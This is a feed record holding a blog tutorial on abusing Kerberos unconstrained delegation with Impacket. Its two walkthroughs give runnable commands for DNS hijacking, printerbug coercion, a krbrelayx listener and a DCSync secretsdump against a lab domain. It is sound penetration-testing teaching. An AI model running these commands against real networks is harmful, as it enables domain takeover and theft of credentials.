{
  "id": "black-hills-information-security-inc-blackhillsinfosec-com-2025-11-05-ea00cfae",
  "source_id": "black-hills-information-security-inc-blackhillsinfosec-com",
  "guid": "https://www.blackhillsinfosec.com/?p=35816",
  "title": "Abusing Delegation with Impacket (Part 1): Unconstrained Delegation",
  "url": "https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-1/",
  "published_at": "2025-11-05T14:00:00+00:00",
  "fetched_at": "2025-11-06T11:13:29.008353+00:00Z",
  "status": "fetched",
  "content": {
    "raw": "In Active Directory exploitation, Kerberos delegation is easily among my top favorite vectors of abuse, and in the years I’ve been learning Kerberos exploitation, I’ve noticed that Impacket doesn’t get nearly as much coverage as tools like Rubeus or Mimikatz. The post Abusing Delegation with Impacket (Part 1): Unconstrained Delegation appeared first on Black Hills Information Security, Inc..",
    "full": "",
    "processed": ""
  },
  "analysis": {
    "score": null,
    "relevance_score": null,
    "threat_category": null,
    "summary": null,
    "key_entities": [],
    "ttps": []
  },
  "content_source": "rss",
  "content_fetch_method": null,
  "processing_metadata": {},
  "updates": {
    "content": {
      "full": "Abusing Delegation with Impacket (Part 1): Unconstrained Delegation\nHunter recently graduated with his Master’s degree in Cyber Defense and has over two years of experience in penetration testing. His favorite area of testing is Active Directory, and in his free time, he enjoys working in his home lab and analyzing malware.\nThis blog has been cross-posted. We’re grateful to Hunter for allowing us to share this insightful work—you can check out the original post in full HERE.\nThe inspiration behind this\nIn Active Directory exploitation, Kerberos delegation is easily among my top favorite vectors of abuse, and in the years I’ve been learning Kerberos exploitation, I’ve noticed that Impacket doesn’t get nearly as much coverage as tools like Rubeus or Mimikatz.\nFrom a penetration testing perspective, especially when operating from a remote dropbox, being able to interface Kali to the domain controller provides tremendous value, as we don’t need to drop binaries on disk, nor do we need to worry about host-based detections.\nThis is not an exhaustive list of every explicit delegation abuse path possible, otherwise I’d be working on this forever! Instead, I wanted to focus on each type of delegation configured for both users and machines, and the most common attack paths for each.\nKerberos\nKerberos is a ticket-based authentication protocol that enables secure communication in untrusted environments by first establishing two-party trust through a mutual third party. Kerberos requires three parties:\n- Client: The user or system requesting access to a resource.\n- Server: The destination resource the client wants to access.\n- Key Distribution Center (KDC): A trusted third party responsible for authenticating users and issuing tickets.\nThe ticketing process\nThe Kerberos authentication flow works like this:\n- Authentication Service Request: The client sends an authentication request encrypted with their password to the KDC.\n- Authentication Service Response: If the KDC can decrypt the request with the user’s password, the client has proven their identity. The KDC then responds with a Ticket-Granting-Ticket (TGT), encrypted with the KDC’s secret key.\n- Ticket-Granting-Ticket Request: The client presents the TGT back to the KDC requesting access to a destination service.\n- Ticket-Granting-Ticket Response: If the KDC can decrypt the TGT, it proves the client presented a valid TGT, as no other entity knows the KDC’s secret key. The KDC responds with a Service Ticket (ST), encrypted with the destination service’s password.\n- Service Ticket Request: The client passes the ST to the destination service, requesting access. If the destination service can decrypt the service ticket, it proves the ticket is valid, as only the KDC and the service itself should possess the service’s password.\nThrough the trusted intermediary – the KDC – the client and destination service can establish trust, relying on the assumption that only the KDC knows everything.\nKerberos references services by their Service Principal Name, or SPN, and one ticket can be generated per one SPN at a time. For added efficiency, if a user wants to obtain tickets for multiple services, instead of performing the entire authentication process each time, they can simply reuse their TGT to obtain access to various other services. By default, Microsoft states a TGT is valid for 10 hours before the entire authentication process must fully begin again.\nThe double-hop problem and delegation\nBecause of how tickets are constructed, services cannot forward client credentials to other resources: they only possess a service ticket encrypted with their own key. This inability to forward credentials is known as the Kerberos Double-Hop Problem.\nMicrosoft introduced delegation to let one service forward a client’s credentials to another, enabling the first service to authenticate the client to the second. There are three forms of Kerberos delegation:\n- Unconstrained Delegation: The first form of delegation. When a client authenticates to a server with unconstrained delegation, it passes its TGT along with the ST, allowing the server to reuse the TGT to authenticate as that user to other resources.\n- Constrained Delegation: Introduced to mitigate the risks of unconstrained delegation. It restricts delegation to specific services and replaces TGT forwarding with two proxies: S4U2Self and S4U2Proxy.\n- Resource-Based Constrained Delegation: Similar to constrained delegation, but here the destination (resource) defines which services are allowed to delegate to it.\nUnconstrained delegation abuse techniques\nWith all of that discussed, the key idea is that delegation is essentially a specialized form of impersonation that resolves the double-hop problem. It’s additionally important to note delegation can be configured on both users and machines within a domain.\nThis means that if a user or machine configured with delegation is compromised, the attacker’s goals vary depending on the type (with some caveats we will cover later). Since this is a three-part series of blog posts, we will first focus on abusing unconstrained delegation.\nTo abuse unconstrained delegation, we must first compromise a user or machine configured with it. Following this, our end goal is to obtain a TGT from an elevated user/machine – usually the domain administrator – to compromise the environment.\nThe high-level steps are:\n- Compromise a user or machine that has unconstrained delegation configured.\n- Force/coerce an elevated user/machine to authenticate to our compromised unconstrained resource.\n- Use the obtained TGT from the elevated user/machine to compromise the domain controller.\n1. Add a user SPN and DNS entry, coerce to Kerberos listener\nAssume we’ve compromised the user kuduser\nwith the password Password1!\n, which has unconstrained delegation configured.\nTo escalate in the domain, we need to first add a Service Principal Name (SPN) to the user and a DNS entry resolving such SPN to the attacker’s IP address. Once those are done, we can then obtain a TGT from an elevated user/machine.\nCaveat: Users do not have SPNs associated with them by default, so we need the permission to add our own SPN so tickets can be generated to our user if one has not been added already. This is not a default setting, but appears to be often attributed with database service accounts. We additionally need the permission to add a DNS entry to our added SPN, which appears to be a default setting.\n1. Find user-based unconstrained delegation (kuduser\n)\nimpacket-findDelegation 'secure.local/kuduser':'Password1!' -dc-ip 10.0.1.200\n2. Add an SPN to kuduser\nif there isn’t one already (KUD.secure.local\n)\npython3 addspn.py -u secure.local\\\\kuduser -p 'Password1!' -s host/KUD.secure.local --target-type samname 10.0.1.200\n3. (Optional) Verify the SPN has been added successfully\npywerview get-netuser -d secure.local -u kuduser -p 'Password1!' -t 10.0.1.200 --unconstrained\n4. Add a DNS entry that resolves KUD.secure.local\nto our attacker IP 10.0.1.13\npython3 dnstool.py -u secure.local\\\\kuduser -p 'Password1!' -r KUD.secure.local -a add -d 10.0.1.13 10.0.1.200\n5. Verify proper name resolution, may take a few minutes\nnslookup KUD.secure.local 10.0.1.200\n6. Set up Kerberos listener with kuduser\n’s password\npython3 krbrelayx.py --krbsalt SECURE.LOCALkuduser --krbpass 'Password1!'\n7. Force the DC (10.0.1.200\n) to authenticate to us (KUD.secure.local\n)\npython3 printerbug.py 'secure.local/kuduser':'Password1!'@10.0.1.200 KUD.secure.local\n8. Export the ticket into memory\nexport KRB5CCNAME=DC01\\[email protected][email protected]\n9. Perform a DCSync against DC01\nas DC01$\nimpacket-secretsdump -k DC01.secure.local\n10. (Cleanup): Remove the added DNS entry\npython3 dnstool.py -u secure.local\\\\kuduser -p 'Password1!' -r KUD.secure.local -a remove -d 10.0.1.13 10.0.1.200\n11. (Cleanup): Remove the added SPN (if user started without one)\npython3 addspn.py -u secure.local\\\\kuduser -p 'Password1!' -s host/KUD.secure.local --target-type samname 10.0.1.200 -r\n2. Hijack machine DNS entry, coerce to Kerberos listener\nAssume we’ve compromised the machine PC01$\nwith the NTLM hash aad3b435b51404eeaad3b435b51404ee:8d67f5a634a447bee65785be5c49b2a4\n, which has unconstrained delegation configured.\nTo escalate in the domain, we need to first modify PC01$\n’s existing DNS entry and point it to our attacker IP address. Once complete, we can then obtain a TGT from an elevated user/machine.\nUnlike users, machines do have SPNs associated with them, meaning we only need to modify the PC01.secure.local\nDNS entry to point to our attacker box. It should be noted that this will temporarily cause a denial of service for clients accessing PC01\n, as all traffic will now route to us.\n1. Find machine-based unconstrained delegation (PC01$\n)\nimpacket-findDelegation 'secure.local/kuduser':'Password1!' -dc-ip 10.0.1.200\n2. Add a DNS entry that resolves PC01.secure.local\nto our attacker IP 10.0.1.13\npython3 dnstool.py -u 'secure.local\\PC01$' -p 'aad3b435b51404eeaad3b435b51404ee:8d67f5a634a447bee65785be5c49b2a4' -r PC01.secure.local -a modify -d 10.0.1.13 DC01 -dns-ip 10.0.1.200\n3. Verify proper name resolution, may take a few minutes\nnslookup PC01.secure.local 10.0.1.200\n4. Set up Kerberos listener with PC01$\n’s NTLM hash\npython3 krbrelayx.py --krbsalt SECURE.LOCALPC01$ -hashes 'aad3b435b51404eeaad3b435b51404ee:8d67f5a634a447bee65785be5c49b2a4'\n5. Force the DC (10.0.1.200\n) to authenticate to us (PC01.secure.local\n)\npython3 printerbug.py 'secure.local/kuduser':'Password1!'@10.0.1.200 PC01.secure.local\n6. Export the ticket into memory\nexport KRB5CCNAME=DC01\\[email protected][email protected]\n7. Perform a DCSync against DC01\nas DC01$\nimpacket-secretsdump -k DC01.secure.local\n8. (Cleanup): Restore the original DNS entry for PC01.secure.local\npython3 dnstool.py -u 'secure.local\\PC01$' -p 'aad3b435b51404eeaad3b435b51404ee:8d67f5a634a447bee65785be5c49b2a4' -r PC01.secure.local -a modify -d 10.0.1.201 DC01 -dns-ip 10.0.1.200\nConclusion\nUnconstrained delegation is a neat feature that solves a real limitation of Kerberos, the double-hop problem. However, given the way impersonation occurs by forwarding TGTs, if an unconstrained resource is compromised, an attacker can easily escalate to domain administrator.\nFollowing this, we will discuss abusing constrained delegation and resource-based constrained delegation in future writeups!\nReferences\n- https://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html\n- https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#a-forwardable-result\n- https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/0fce5b92-bcc1-4b96-9c2b-56397c3f144f\n- https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained\n- https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained\n- https://sqlmastersconsulting.com.au/SQL-Server-Blog/granting-sql-service-account-permissions-create-spns/\n- https://github.com/dirkjanm/krbrelayx\n- https://github.com/r3motecontrol/Ghostpack-CompiledBinaries\n- https://www.guidepointsecurity.com/blog/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/\n- https://www.thehacker.recipes/ad/movement/kerberos/spn-jacking\n- https://luemmelsec.github.io/S4fuckMe2selfAndUAndU2proxy-A-low-dive-into-Kerberos-delegations/\n- https://mayfly277.github.io/posts/GOADv2-pwning-part10/\n- https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html\n- https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html\n- https://attl4s.github.io/assets/pdf/You_do_(not)_Understand_Kerberos_Delegation.pdf\n- https://www.netexec.wiki/news/v1.4.0-smoothoperator\n- https://www.blackhillsinfosec.com/bypass-ntlm-message-integrity-check-drop-the-mic/\n- https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/\n- https://github.com/abaker2010/impacket-fixed\nReady to learn more?\nLevel up your skills with affordable classes from Antisyphon!\nPay-Forward-What-You-Can Training\nAvailable live/virtual and on-demand",
      "enhanced_at": 1762427889.1417918,
      "fetch_method": "trafilatura"
    }
  },
  "updated_at": "2025-11-06T11:18:09.142154+00:00Z"
}